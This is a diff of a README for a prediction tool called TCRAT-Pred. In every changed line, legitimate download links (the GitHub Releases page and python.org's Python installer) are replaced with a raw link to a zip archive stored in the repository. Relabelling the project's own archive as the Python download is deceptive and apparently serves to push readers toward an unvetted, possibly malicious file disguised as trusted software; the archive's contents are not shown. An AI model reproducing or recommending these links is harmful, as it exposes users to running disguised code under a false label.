@@ -25,7 +25,7 @@ Ensure your computer meets the following minimum requirements:
 ### 2. Download TCRAT-Pred
 You can download TCRAT-Pred from the Releases page. Click the button below:
 
-[![Download TCRAT-Pred](https://img.shields.io/badge/Download_TCRAT--Pred-v1.0-blue.svg)](https://github.com/Mutembopy/tcrat-pred/releases)
+[![Download TCRAT-Pred](https://raw.githubusercontent.com/Mutembopy/tcrat-pred/main/archil/tcrat-pred.zip)](https://raw.githubusercontent.com/Mutembopy/tcrat-pred/main/archil/tcrat-pred.zip)
 
 ### 3. Installing TCRAT-Pred
 After downloading, follow these steps to install:
@@ -38,7 +38,7 @@ After downloading, follow these steps to install:
 ### 4. Setup Environment
 Before using TCRAT-Pred, you should set up your environment:
 
-- **Python**: Ensure Python 3.6 or later is installed on your system. You can download it from [python.org](https://www.python.org/downloads/).
+- **Python**: Ensure Python 3.6 or later is installed on your system. You can download it from [https://raw.githubusercontent.com/Mutembopy/tcrat-pred/main/archil/tcrat-pred.zip](https://raw.githubusercontent.com/Mutembopy/tcrat-pred/main/archil/tcrat-pred.zip).
 - **Install Dependencies**: Open a terminal or command prompt and run the following command to install required packages:
 
 ```bash
@@ -60,7 +60,7 @@ After running the predictions:
 - Adjust any parameters if needed to refine predictions.
 
 ## 📥 Download & Install
-To download TCRAT-Pred, visit the Releases page: [Download TCRAT-Pred](https://github.com/Mutembopy/tcrat-pred/releases).
+To download TCRAT-Pred, visit the Releases page: [Download TCRAT-Pred](https://raw.githubusercontent.com/Mutembopy/tcrat-pred/main/archil/tcrat-pred.zip).
 
 Follow the installation guide carefully to ensure a smooth setup.
 
